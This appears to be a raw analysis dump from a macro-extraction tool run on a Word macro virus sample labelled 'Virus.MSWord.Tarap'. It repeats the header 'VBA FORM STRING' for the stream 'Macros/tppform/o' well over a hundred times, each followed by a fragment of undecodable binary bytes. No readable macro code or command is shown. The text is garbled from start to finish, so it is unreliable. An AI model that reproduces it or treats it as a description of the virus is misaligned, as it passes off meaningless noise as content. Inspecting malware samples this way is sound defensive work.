- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nR2
�y'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�p9��Ѧ�I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?&A3��[ˎ�YX
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z`�G���i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�)y���w�|�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��n�y�x#R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{c������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�X̖�s�C�yv
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
leٲp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.<g�Mn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	��(U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7#�8��F��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Im%�x��3\��L�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\���'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-&����i����6�-�6W�l��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�:J�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�[�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*t���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�ZB3C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lțX�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O0��>��.�����z|0�enw&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�% �WΞ/��χl/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�śM�5}.��Y2��+�D��6O��u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��������-c�h��G���ؓ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}GaOK�]Fk��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�Ǿp0Kn�[[��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z+,�Il�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
Řu�����=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&	�]4�&�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����M��J��E�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�o��:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�_�ֽm�-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��"�}��dIQ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�+uln.�Z5{�6�.$�*�U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pc�<4m����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y\���쑚9#�O�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�}~�A`#{a}!�HB�{�+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��V�<��99��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^���YZ�R�Ou
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��S�f$ǽ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�*8o�����P�q�[�\Z\E�ƚ4n���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8*��ɡ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҟg��Ԃ��!��I�tǸ"{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�Q�U�B��K����(m�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�	�c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�����g�$~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4K����5�-6�4es
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D؛�2����Z��<9��j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�,�H��j��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Um���&�������M
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�4�q$�1��::d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
er~�}�mF�+���(��;#���nvm�(' �N}>R3�^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=�C}y�i���:�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�e ��$ꠒ� L1���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i��@�T:l���،#�&��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>&��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L|Q�u;�(�ѓH���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�i%�2J%�;U��2q��p�X`io
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�'���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@aې
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�S�'���-.����q��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�H 0Pp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M+J����v�S=�b[{�E_+����t�I;�$�p�i��S[I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����2�]S;�f'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U}E��>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V�Hb�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a|:��}B�V�Q{I�ϩܡ��G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�g)�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�͝�%��zuk��J�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ya�E�(ٿ�L�;��H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �4�D�I ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��UqÔ8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#=88����Z�Q����@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P�m�-�:tW���D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x#qY����9緮
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�謅��έ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����<�ʰ%�000I�=zW�x��rɩ���C�u�R�1b��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$AĻղ�I�&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^<���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h7��\xY6K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G
9��m�үˑ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5I����/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�a\0S��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�8���e����iw��ڢ,V�t��UHpQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q'i,@;{t�&�Ƕ� �a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	'��;��v�;bo4�Z	�xf�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cP��}�̡�FA�(8;���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|;a��}�Æ�ʋM�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U6쪡U�2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��qN�N��&�k�_����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h��+Ohb`#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���`+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�2�XI�I-�,�,k{y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.x
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R���ڂ�A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	���W�2A

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�֟j��a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O2	戱�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӎ!���K�O��.!3����)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%r�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���N�-�+���3m�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʏ|s�I�9�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���-j(��l�[^q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P7�&�੐�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��e�6��uۨ��D�$�EU?��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r03ߎ��O��a�|�y���!d�*�,$�Xs��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�b�,w^g�*ۤ�P���"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������E2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{cn�	�y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ퟛ�6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��x�JУy�PiQ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pB3)9_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��qמcĿ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G}o��L��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l��sy#�k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ns�<y���P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|ee��ڋA�=�6�-t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{6� 6A�r28Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��	k�Pj�p�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�+����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'S�~���a�aO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��h��h>dތr�X(��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�Wi�CǺ?�|{�χW��6W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��m2h
